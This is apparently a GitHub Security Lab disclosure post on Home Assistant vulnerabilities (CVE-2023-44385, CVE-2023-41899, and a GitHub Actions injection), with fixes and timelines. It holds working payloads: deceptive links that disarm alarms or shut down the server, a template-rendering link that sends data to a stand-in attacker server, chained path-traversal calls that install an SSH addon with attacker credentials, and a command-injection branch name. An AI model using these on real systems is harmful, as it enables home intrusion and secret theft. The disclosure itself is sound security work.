An attacker can create a deceptive link or QR code to trick a victim into clicking on it. It’s important to note that although clicking on a `homeassistant://` URL will prompt the user to confirm before opening it in Home Assistant, there are other more discreet methods of attack such as using an universal link. Home Assistant allows the use of [Universal links](https://companion.home-assistant.io/docs/integrations/universal-links), which are registered under the `https://www.home-assistant.io/ios/` URL. This allows us to use an `https://` link to call any `homeassistant://` URLs, making these payloads appear less suspicious. For example, if we share the link `https://www.home-assistant.io/ios/?url=homeassistant://%2F%2Fcall_service%2Flight.turn_on%3Fentity_id%3Dall` on Slack, unsuspecting victims who click on this seemingly harmless link (since it’s hosted on `www.home-assistant.io`) will unknowingly turn on all their house lights. Similar tactics can be used to disarm an alarm (`homeassistant://call_service/alarm_control_panel.alarm_disarm`) or shut down the Home Assistant server (`homeassistant://call_service/hassio.host_shutdown`) by scanning a QR code.

In some cases, attackers may need to find out entity IDs or area names for certain services. In these situations, an attacker could exploit the `render_template` action to run arbitrary templates and send the response to their own server: `homeassistant://x-callback-url/render_template?x-success=https:%2F%2Fattacker-server.com&template`.

![](https://github.blog/wp-content/uploads/2023/11/image3.png?w=1024&resize=1024%2C204)

Clicking on the above link on Slack will trigger the action without requesting any confirmation from the user.

This attack can also be carried out using QR codes. When the iPhone QR reader detects a Home Assistant URL, it will display a yellow banner warning the user beforehand.

![](https://github.blog/wp-content/uploads/2023/11/image13.png?w=328&resize=328%2C443)

However, an attacker has the ability to employ redirection in order to conceal the ultimate URL from the QR reader, thereby making it appear less suspicious. For instance:

![](https://github.blog/wp-content/uploads/2023/11/image10.png?w=330&resize=330%2C485)

The same vulnerability also applies to App Intents using the Siri or Shortcuts apps. An attacker can potentially conceal malicious service calls within popular Shortcuts found in the Shortcuts gallery. As a result, when these shortcuts are executed, the corresponding services will be called.

### Mitigation

Home Assistant now [requires the user to confirm any actions](https://github.com/home-assistant/iOS/pull/2417) triggered from URL actions. Now, when you click on a `https://www.home-assistant.io/ios/?url=homeassistant://%2F%2Fcall_service%2Flight.turn_on%3Fentity_id%3Dall` URL, Home Assistant will display a confirmation dialog like the following:

![](https://github.blog/wp-content/uploads/2023/11/image5.png?w=345&resize=345%2C278)

#### Timeline

  * 2023-07-17: Issue reported to [security@home-assistant.io](mailto:security@home-assistant.io).
  * 2023-08-28: A[ public issue](https://github.com/home-assistant/core/issues/99191) was opened to request an alternative security contact, as we hadn’t heard back.
  * 2023-08-28: Home Assistant informed us that they moved to [GitHub Private Vulnerability Reporting](https://docs.github.com/en/code-security/security-advisories/guidance-on-reporting-and-writing-information-about-vulnerabilities/privately-reporting-a-security-vulnerability).
  * 2023-08-28: Issue reported through GitHub Private Vulnerability Reporting.
  * 2023-10-04: CVE-2023-44385 assigned to this issue.
  * 2023-10-10: Fix was released in [2023.7 version](https://github.com/home-assistant/iOS/releases/tag/release%2F2023.7%2F2023.471).
  * 2023-10-20: [Advisory](https://github.com/home-assistant/core/security/advisories/GHSA-h2jp-7grc-9xpp) published.

### Re-evaluate the attack surface, rinse and repeat

After identifying the vulnerabilities mentioned previously, we had to reevaluate our assumptions and determine if we could expand the attack surface. It appears that we can now manipulate a user into invoking arbitrary services (`call_service`) or triggering arbitrary events (`fire_event`). This means that even if the backend handlers require authenticated requests, an attacker can still access them by exploiting the Client-Side Request Forgery mentioned earlier!

To analyze these new sources of untrusted data, we utilized CodeQL to model service calls handlers as sources of untrusted data and conducted another scan of the Home Assistant code. As a result, we discovered a new finding.

## CVE-2023-41899/GHSL-2023-162: Partial server-side request forgery in Core

The `hassio.addon_stdin` service had a vulnerability that allowed for partial Server-Side Request Forgery (SSRF). An attacker who could call this service (for example, through the vulnerability `GHSL-2023-161`) was able to send a POST request to invoke any Supervisor REST API endpoints.

The `hassio.addon_stdin` service is handled by the [HASSIO service handler](https://github.com/home-assistant/core/blob/c54ceb2da21fe0595326923cfdab65206f8a8f57/homeassistant/components/hassio/__init__.py#L486):
  
  
  async def async_service_handler(service: ServiceCall) -> None:
  """Handle service calls for Hass.io."""
  api_endpoint = MAP_SERVICE_API[service.service] # [1]
  
  data = service.data.copy()
  addon = data.pop(ATTR_ADDON, None)
  slug = data.pop(ATTR_SLUG, None)
  payload = None
  
  # Pass data to Hass.io API
  if service.service == SERVICE_ADDON_STDIN:
  payload = data[ATTR_INPUT]
  elif api_endpoint.pass_data:
  payload = data
  
  # Call API
  # The exceptions are logged properly in hassio.send_command
  with suppress(HassioAPIError):
  await hassio.send_command(  # [2]
  api_endpoint.command.format(addon=addon, slug=slug),
  payload=payload,
  timeout=api_endpoint.timeout,
  )
  

An attacker able to call this service will control the `service` variable including its `data` attribute, and therefore, the `addon` and `payload` key/values.

When calling the `hassio.addon_stdin`, the `service.service` value will be `hassio.addon_stdin` and `api_endpoint.command` [retrieved](https://github.com/home-assistant/core/blob/c54ceb2da21fe0595326923cfdab65206f8a8f57/homeassistant/components/hassio/__init__.py#L212) from `MAP_SERVICE_API` ([1]) will be `/addons/{addon}/stdin`.

When calling `send_command` ([2]), an attacker will be able to control the `addon` format string parameter and therefore change the value of the URL passed to `send_command` ([code](https://github.com/home-assistant/core/blob/e44c74f9eb783e1ccea4598236b702496ca41453/homeassistant/components/hassio/handler.py#L519)).
  
  
  async def send_command(
  self,
  command,
  method="post",
  payload=None,
  timeout=10,
  return_text=False,
  *,
  source="core.handler",
  ):
  """Send API command to Hass.io.
  
  This method is a coroutine.
  """
  try:
  request = await self.websession.request(
  method,
  f"http://{self._ip}{command}",
  json=payload,
  headers={
  aiohttp.hdrs.AUTHORIZATION: (
  f"Bearer {os.environ.get('SUPERVISOR_TOKEN', '')}"
  ),
  X_HASS_SOURCE: source,
  },
  timeout=aiohttp.ClientTimeout(total=timeout),
  )
  ...
  

In this code, the `send_command` function sends an authenticated `application/json` POST request to the supervisor API. This allows an attacker to manipulate the path and body of the request.

#### PoC

There are various methods an attacker can use to exploit this vulnerability. For instance, they can send the following four POST requests to accomplish tasks such as installing the SSH addon, disabling its protection mode, configuring SSH credentials and boot commands, and restarting the addon for the changes to take effect:
  
  
  data: {"addon": "../store/addons/a0d7b954_ssh/install?", "input": {}}
  
  
  
  service: hassio.addon_stdin
  data: {"addon": "a0d7b954_ssh/security?", "input": {"protected":false}}
  
  
  
  service: hassio.addon_stdin
  data: {"addon": "a0d7b954_ssh/options?", "input": {"options":{"init_commands": ["touch /tmp/pwned-ha", "ls /tmp"], "packages": [], "share_sessions": false, "zsh": true, "ssh": {"allow_agent_forwarding":false, "allow_remote_port_forwarding":false, "allow_tcp_forwarding":false, "authorized_keys": [], "compatibility_mode": false, "password":"pwned", "sftp":false, "username":"hassio"}}}}
  
  
  
  service: hassio.addon_stdin
  data: {"addon": "a0d7b954_ssh/restart?", "input": {}}
  

As we can see in the first service call, we are using a path traversal to reach the `/store/addons/&lt;id&gt;/install` endpoint and a `?` to discard the suffix added in the injection point (`/stdin`) by treating it as a query parameter. Calling these services chained, we will create a new file called `/tmp/pwned-ha` in the Core container.

In the initial service call, we employ a path traversal technique to access the `/store/addons/&lt;id&gt;/install` endpoint. We also utilize a `?` to disregard the additional suffix appended at the injection point (`/stdin`) by treating it as a query parameter. By chaining these services together, we will generate a new file named `/tmp/pwned-ha` in the Core container.

This vulnerability can be triggered via the CSRF (GHSL-2023-161). The easiest way to execute these four `call_service` commands in a row, is by using a malicious Apple Shortcut such as:

![](https://github.blog/wp-content/uploads/2023/11/image6.png?w=639&resize=639%2C720)

These actions can be hidden within a longer shortcut meant to do something else (for example, ChatGPT integration) and shared with the victim.

### Mitigation

The addon slug is now [validated](https://github.com/home-assistant/core/pull/99232) against a closed list of valid addon slugs.

#### Timeline

  * 2023-07-17: Issue reported to [security@home-assistant.io](mailto:security@home-assistant.io).
  * 2023-08-28: A [public issue](https://github.com/home-assistant/core/issues/99191) was opened to request an alternative security contact, as we hadn’t heard back.
  * 2023-08-28: Home Assistant informed us that they moved to [GitHub Private Vulnerability Reporting](https://docs.github.com/code-security/security-advisories/guidance-on-reporting-and-writing-information-about-vulnerabilities/privately-reporting-a-security-vulnerability).
  * 2023-08-28: Issue reported through GitHub Private Vulnerability Reporting.
  * 2023-09-06: Fix was released in [2023.9 version](https://www.home-assistant.io/blog/2023/09/06/release-20239/)
  * 2023-09-13: CVE-2023-41899 assigned to this issue.
  * 2023-10-20: [Advisory](https://github.com/home-assistant/core/security/advisories/GHSA-4r74-h49q-rr3h) published.

## Securing the CI/CD pipeline

Another element of the attack surface that normally goes unnoticed is the CI/CD pipeline. A successful attack against the pipeline could empower adversaries to manipulate the code build and release processes. We analyzed the different [GitHub Actions created by Home Assistant](https://github.com/home-assistant/actions/) for potential injection vulnerabilities actions and found some that were vulnerable to expression injection.

### GHSL-2023-179:GitHub Actions Expression Injection in helpers/version/action.yml

When running the standard CodeQL queries on the Home Assistant repositories, we got few other vulnerabilities reported on their own GitHub Actions. For example, the `helpers/version`]([source code](https://github.com/home-assistant/actions/blob/3516188c0268acb4d0b0a7a984f9668c348deca0/helpers/version/action.yml#L104)) Action interpolated the raw `github.head_ref` variable inside the `publish` run step:
  
  
  - shell: bash
  id: publish
  run: |
  ...
  elif [[ "${{ inputs.type }}" =~ (plugin|supervisor) ]]; then
  if [[ ! -z "${{ github.head_ref }}" ]]; then
  ...
  

In the event of a workflow using `home-assistant/actions/helpers/version`, an attacker could submit a pull request from a branch with a specially crafted name, that if run, could gain command execution in the step and potentially leak secrets.

#### PoC

  1. Simulate a vulnerable repository by creating a new repository with the following workflow:

  
  
  name: Example
  
  on: pull_request
  
  jobs:
  example:
  runs-on: ubuntu-latest
  steps:
  - name: Get version
  id: version
  uses: home-assistant/actions/helpers/version@v1.0.0
  

  1. Submit a pull request to the newly created repository from a branch named after the command injection payload. Note that even though the allowed charset for branch names is somewhat limited and branches [cannot have spaces or colons](https://mirrors.edge.kernel.org/pub/software/scm/git/docs/git-check-ref-format.html) in their names, command injection is still possible. For example `foo";echo${IFS}"hello";#` would be a valid branch name to submit the pull request from. This character set is more than enough for attackers to compromise the target repository.
  2. Upon approval of the workflow (triggered by the pull request), the action will get executed and the malicious pull request branch name will flow into the command injection sink.

### Mitigation

Variables used in `run/script` steps are sanitized by forcing them into a string by assigning them to an environment variable in an `env` step, and then use those variables within the `run/script` steps:
  
  
  - shell: bash
  id: publish
  env:
  ...
  INPUTS_TYPE: ${{ inputs.type }}
  HEAD_REF: ${{ github.head_ref }}
  ...
  run: |
  ...
  elif [[ "$INPUTS_TYPE" =~ (plugin|supervisor) ]]; then
  if [[ ! -z "$HEAD_REF" ]]; then
  ...
  

#### Timeline

  * 2023-07-17: Issue reported to security@home-assistant.io.
  * 2023-08-28: A public issue was opened to request an alternative security contact, as we hadn’t heard back.
  * 2023-08-28: Home Assistant informed us that they moved to GitHub Private Vulnerability Reporting.
  * 2023-08-28: Issue reported through GitHub Private Vulnerability Reporting.
  * 2023-09-05: [Fix merged](https://github.com/home-assistant/actions/pull/93).
  * 2023-10-20: [Advisory published](https://github.com/home-assistant/core/security/advisories/GHSA-jff5-5j3g-vhqc).

## Credits

This team audit involved active participation from everyone through discussions, brainstorming sessions, threat modeling, and more. Below is a list of the individuals who discovered each vulnerability mentioned in this blog post.

  * GHSL-2023-142: Tony Torralba ([@atorralba](https://github.com/atorralba))
  * GHSL-2023-161: Alvaro Muñoz ([@pwntester](https://github.com/pwntester))
  * GHSL-2023-162: Alvaro Muñoz ([@pwntester](https://github.com/pwntester))
  * GHSL-2023-163: Peter Stöckli ([@p-](https://github.com/p-))
  * GHSL-2023-164: Peter Stöckli ([@p-](https://github.com/p-))
  * GHSL-2023-179: Jorge Rosillo ([@jorgectf](https://github.com/jorgectf)) and Peter Stöckli ([@p-](https://github.com/p-))

## Home Assistant at the core of our smart homes

Home Assistant is a powerful software that acts as the central hub for smart homes worldwide. It orchestrates and coordinates the many interconnected devices in our homes, making it an essential command center and its security of utmost importance.

Compromise of the system could lead to serious consequences, including disarming our alarm systems, interfering with our heating and cooling systems, or invading our privacy through security cameras. These possibilities highlight the need to protect our digital fortresses.

### Security recommendations to keep your smart home secure

To ensure the security of Home Assistant, there are several measures that you can take:

  * **Keep the software up to date.** Regularly update Home Assistant with the latest security patches and bug fixes. This helps protect against known vulnerabilities.
  * **Secure remote access.** If you need to access Home Assistant remotely, use secure methods, such as setting up a VPN or utilizing encrypted protocols like SSH or HTTPS.
  * **Network segmentation.** Separate your smart home devices and Home Assistant server on different network segments or VLANs. This helps contain any potential compromise to only certain devices or services.
  * **Disable unnecessary features.** Disable any unnecessary integrations or plugins in Home Assistant to reduce the attack surface and potential vulnerabilities.
  * **Use trusted components and integrations.** Only use components and integrations from reputable sources that have been vetted for security.

By following these recommendations, you can enhance the security of your Home Assistant installation and better protect your smart home from potential risks.

## Conclusion

The security code review of Home Assistant highlighted several vulnerabilities and potential security issues, and addressing these findings is crucial to ensure the secure operation of Home Assistant and protect users’ smart homes from potential risks.

We would like to thank the Home Assistant team for their prompt response and cooperation in resolving the vulnerabilities we reported. Their commitment to security and the swift action taken to address these issues is greatly appreciated and helps build trust in the Home Assistant platform and community!

Stay tuned for other code reviews of home server software. Until then, stay secure!

* * *

## Tags:

  * [ GitHub Security Lab ](https://github.blog/tag/github-security-lab/)
  * [ open source ](https://github.blog/tag/open-source/)
  * [ security research ](https://github.blog/tag/security-research/)

##  Written by 

![Alvaro Munoz](https://avatars.githubusercontent.com/u/125701?v=4&s=200)

###  [Alvaro Munoz](https://github.blog/author/pwntester/)

[@pwntester](https://github.com/pwntester)

  * [ GitHub Security Lab ](https://github.blog/tag/github-security-lab/)
  * [ open source ](https://github.blog/tag/open-source/)
  * [ security research ](https://github.blog/tag/security-research/)

## Table of Contents

  * Introduction
  * Securing the supply chain by securing our developer’s home labs
  * Home Assistant architecture
  * Methodology used
  * A test environment with debugging support
  * Detailed review of findings
  * CVE-2023-41893/GHSL-2023-164:Unrestricted OAuth2 Clients
  * CVE-2023-41896/GHSL-2023-163 Authorization Code Exfiltration
  * Attack surface review
  * CVE-2023-41898/GHSL-2023-142:Arbitrary URL Load in Android WebView in MyActivity.kt
  * CVE-2023-44385/GHSL-2023-161: Client-Side request forgery in iOS, macOS native apps
  * CVE-2023-41899/GHSL-2023-162: Partial server-side request forgery in Core
  * Securing the CI/CD pipeline
  * Credits
  * Home Assistant at the core of our smart homes
  * Conclusion

## More on [GitHub Security Lab](https://github.blog/tag/github-security-lab/)

### [Hack the AI agent: Build agentic AI security skills with the GitHub Secure Code Game](https://github.blog/security/hack-the-ai-agent-build-agentic-ai-security-skills-with-the-github-secure-code-game/)

Learn to find and exploit real-world agentic AI vulnerabilities through five progressive challenges in this free, open source game that over 10,000 developers have already used to sharpen their security skills.

[Joseph Katsioloudes](https://github.blog/author/jkcso/ "Posts by Joseph Katsioloudes")

### [Securing the open source supply chain across GitHub](https://github.blog/security/supply-chain-security/securing-the-open-source-supply-chain-across-github/)

Recent attacks on open source focus on exfiltrating secrets; here are the prevention steps you can take today, plus a look at the security capabilities GitHub is working on.

[Zachary Steindler](https://github.blog/author/steiza/ "Posts by Zachary Steindler")

##  Related posts 

![A shield with a checkmark icon appears centered among decorative green blocks.](https://github.blog/wp-content/uploads/2026/01/github-generic-security-blocks-logo.png?resize=400%2C212)

[AI & ML](https://github.blog/ai-and-ml/)

###  [ Making secret scanning more trustworthy: Reducing false positives at scale ](https://github.blog/security/making-secret-scanning-more-trustworthy-reducing-false-positives-at-scale/)

Alerts are more trustworthy and actionable when noise is reduced. See how we improved the verification step with context-aware LLM reasoning.

[Mariko Wakabayashi](https://github.blog/author/mwakaba2/ "Posts by Mariko Wakabayashi")

![A grid of abstract cubes highlights a central cube displaying a shield with a checkmark to represent security.](https://github.blog/wp-content/uploads/2026/01/generic-security-logo-blocks-github.png?resize=400%2C212)

[Security](https://github.blog/security/)

###  [ Investigation update: GitHub Enterprise Server signing key rotation ](https://github.blog/security/investigating-unauthorized-access-to-githubs-internal-repositories/)

GitHub Enterprise Server customers need to take immediate action.

[Alexis Wales](https://github.blog/author/alexiswales/ "Posts by Alexis Wales")

![](https://github.blog/wp-content/uploads/2021/06/GitHub-Bug-Bounty.png?resize=400%2C212)

[Security](https://github.blog/security/)

###  [ Raising the bar: Quality, shared responsibility, and the future of GitHub’s bug bounty program ](https://github.blog/security/raising-the-bar-quality-shared-responsibility-and-the-future-of-githubs-bug-bounty-program/)

We’re updating our bug bounty program standards to prioritize quality submissions, clarify shared responsibility boundaries, and evolve how we reward low-risk findings.

[Jarom Brown](https://github.blog/author/jarombrown/ "Posts by Jarom Brown")

##  Explore more from GitHub 

![Docs](https://github.blog/wp-content/uploads/2024/07/Icon-Circle.svg)

###  Docs 

Everything you need to master GitHub, all in one place.

[ Go to Docs ](https://docs.github.com/)

![GitHub Universe 2023](https://github.blog/wp-content/uploads/2023/08/Icon-Circle.svg)

###  GitHub Universe 2023 

Get free virtual tickets to the global developer event for AI, security, and DevEx.

[ Get free tickets ](https://githubuniverse.com/)

![GitHub Copilot](https://github.blog/wp-content/uploads/2022/05/Copilot_Blog_Icon-1.svg)

###  GitHub Copilot 

Don’t fly solo. Try 30 days for free.

[ Learn more ](https://github.blog/ai-and-ml/github-copilot/)

![Enterprise content](https://github.blog/wp-content/uploads/2022/05/careers.svg)

###  Enterprise content 

Executive insights, curated just for you

[ Get started ](https://github.com/solutions/executive-insights)

## We do newsletters, too

Discover tips, technical guides, and best practices in our biweekly newsletter just for devs.

Your email address

* Your email address

Subscribe

Yes please, I’d like GitHub and affiliates to use my information for personalized communications, targeted advertising and campaign effectiveness. See the [GitHub Privacy Statement](https://github.com/site/privacy) for more details. 

Subscribe
